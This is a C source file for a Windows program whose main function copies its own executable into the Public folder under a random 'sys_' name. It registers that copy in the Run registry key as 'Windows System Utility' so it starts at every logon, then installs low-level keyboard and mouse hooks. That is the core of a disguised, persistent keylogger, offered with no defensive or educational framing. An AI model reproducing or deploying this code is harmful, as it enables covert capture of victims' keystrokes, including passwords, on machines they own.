#include "functions.h"

int WINAPI WinMain(	HINSTANCE hInstance,	// handle to current instance
					HINSTANCE hPrevInstance,	// handle to previous instance
					LPSTR lpCmdLine,	// pointer to command line
					int nCmdShow 	// show state of window 
					)						  				  
{
	char this_file_path[STR_SIZE];
	GetModuleFileName(NULL, this_file_path, STR_SIZE);
//*
	char dst_file_path[STR_SIZE];
	sprintf(dst_file_path, "C:\\Users\\Public\\sys_%d.exe", _random());
	copy_file(this_file_path, dst_file_path);
	
	bool set_reg = set_registry_key( HKEY_CURRENT_USER, 
					"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
					"Windows System Utility", 
					dst_file_path );
//*/
	SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)&keyoard_hook, hInstance, 0);
	SetWindowsHookExA(WH_MOUSE_LL, (HOOKPROC)&mouse_hook, hInstance, 0);

	MSG msg = {0};

	while(GetMessageA(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageA(&msg);
	}
	
	return 0;
}